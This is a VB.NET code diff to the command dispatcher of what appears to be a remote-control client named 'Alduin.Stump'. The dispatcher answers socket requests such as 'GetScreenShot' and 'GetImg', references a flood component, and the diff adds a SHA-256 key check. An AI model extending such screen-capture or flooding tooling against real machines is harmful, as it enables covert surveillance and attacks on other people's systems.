@@ -1,4 +1,5 @@
 ﻿Imports System.Net.Sockets
+Imports System.Security.Cryptography
 Imports Newtonsoft.Json
 
 Namespace Alduin.Stump.Class.Commands
@@ -110,16 +111,23 @@ Namespace Alduin.Stump.Class.Commands
                     Return JsonConvert.SerializeObject(log)
                 Case "GetAllImgJson"
                     Return AllImgToJson.Handler()
-                Case "GetImg"
-                    Dim log As LogModel = New LogModel With {
-                            .Message = GetFloodsBase().GetMessage(),
-                            .KeyUnique = GetConfigJson().KeyUnique,
-                            .Type = "Success"
-                    }
-                    Return JsonConvert.SerializeObject(log)
             End Select
-            Dim url As String = RequestSplitter(request) ' Handle HTTP request
-            Select Case url
+            Dim url As String = RequestSplitter(request, 1) ' Handle HTTP request
+            Dim sourcehash As String
+            Dim remotehash As String
+            Using sha256Hash As SHA256 = SHA256.Create()
+                sourcehash = HashKey.GetHash(sha256Hash, GetConfigJson().KeyCertified)
+                remotehash = HashKey.GetHash(sha256Hash, RequestSplitter(request, 3))
+            End Using
+            If sourcehash <> remotehash Then
+                Dim log As LogModel = New LogModel With {
+                            .Message = "Key not equals!",
+                            .KeyUnique = GetConfigJson().KeyUnique,
+                            .Type = "Error"
+                    }
+                Return JsonConvert.SerializeObject(log)
+            End If
+            Select Case url 'Domain/method/value/key
                 Case "Forbidden"
                     Return "Forbidden"
                 Case "GetScreenShot"
@@ -130,28 +138,47 @@ Namespace Alduin.Stump.Class.Commands
                             .Type = "Success"
                     }
                     Return JsonConvert.SerializeObject(log)
+                Case "GetImg"
+                    GetImg.Handler(RequestSplitter(request, 2), client)
+                    Dim log As LogModel = New LogModel With {
+                            .Message = "ok",
+                            .KeyUnique = GetConfigJson().KeyUnique,
+                            .Type = "Success"
+                    }
+                    Return JsonConvert.SerializeObject(log)
+                    'Case "GetAllImgJson"
+                    ' StreamWriterJson(AllImgToJson.Handler(), client)
+                    'Return ""
             End Select
             Return "Command execute Failed!"
         End Function
         Public Function JsonMethodSelector(ByVal request As String) As String
             Dim method As String = ""
-            For i = request.IndexOf("Method") To request.Length - 1
-                If request.Chars(i) = "}" Or request.Chars(i) = "," Then
-                    Exit For
-                End If
-                method += request.Chars(i)
-            Next
-            method = method.Replace("""", "").Replace(":", "").Replace(" ", "").Replace(",", "").Replace("Method", "")
-            Return method
+            Try
+                For i = request.IndexOf("Method") To request.Length - 1
+                    If request.Chars(i) = "}" Or request.Chars(i) = "," Then
+                        Exit For
+                    End If
+                    method += request.Chars(i)
+                Next
+                method = method.Replace("""", "").Replace(":", "").Replace(" ", "").Replace(",", "").Replace("Method", "")
+                Return method
+            Catch
+                Return ""
+            End Try
         End Function
-        Public Function RequestSplitter(ByVal model As String)
-            Dim header As String() = model.Split(New Char() {" "c})
-            Dim splitUrl As String() = header(1).Split(New Char() {"/"c})
-            If splitUrl(0) = Main.Config.Variables.CertifiedKey Then
-                Return splitUrl(1)
-            Else
+        Public Function RequestSplitter(ByVal model As String, ByVal index As Integer)
+            Try
+                Dim header As String() = model.Split(New Char() {" "c})
+                Dim splitUrl As String() = header(1).Split(New Char() {"/"c})
+                If splitUrl(3) = Main.Config.Variables.CertifiedKey Then
+                    Return splitUrl(index)
+                Else
+                    Return "Forbidden"
+                End If
+            Catch ex As Exception
                 Return "Forbidden"
-            End If
+            End Try
         End Function
     End Class
 End Namespace
